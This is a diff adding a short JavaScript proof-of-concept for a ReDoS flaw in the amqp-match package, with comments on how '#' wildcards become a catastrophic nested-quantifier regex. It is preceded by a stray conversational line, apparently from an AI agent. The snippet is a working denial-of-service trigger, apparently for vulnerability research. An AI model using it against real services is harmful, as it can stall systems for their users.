@@ -1,0 +1,19 @@
+Good — that combination hangs past 15s, confirming exponential blowup. Using the smaller, still-slow example for the exploit snippet so it terminates in a demonstrable few seconds.
+
+```javascript
+// ReDoS in amqp-match: match() builds a regex from `expected` where each
+// "#" wildcard expands to the catastrophic pattern ([^.]+.?)+ (the intended
+// "\\." literal-dot escape is broken inside the single-quoted JS string, so
+// it becomes an unescaped "." wildcard). Chaining several "#" wildcards
+// produces adjacent nested-quantifier groups over overlapping character
+// classes, causing exponential backtracking when actual doesn't match.
+const match = require("./node_modules/amqp-match");
+
+const expected = "#".repeat(15);      // routing pattern with many "#" wildcards
+const actual = "a".repeat(30) + "!";  // short input, fails to match at the very end
+
+console.log("Triggering ReDoS with a 45-character input...");
+const start = Date.now();
+match(actual, expected);              // hangs for seconds on trivial input size
+console.log("Took " + (Date.now() - start) + " ms (exponential blowup)");
+```
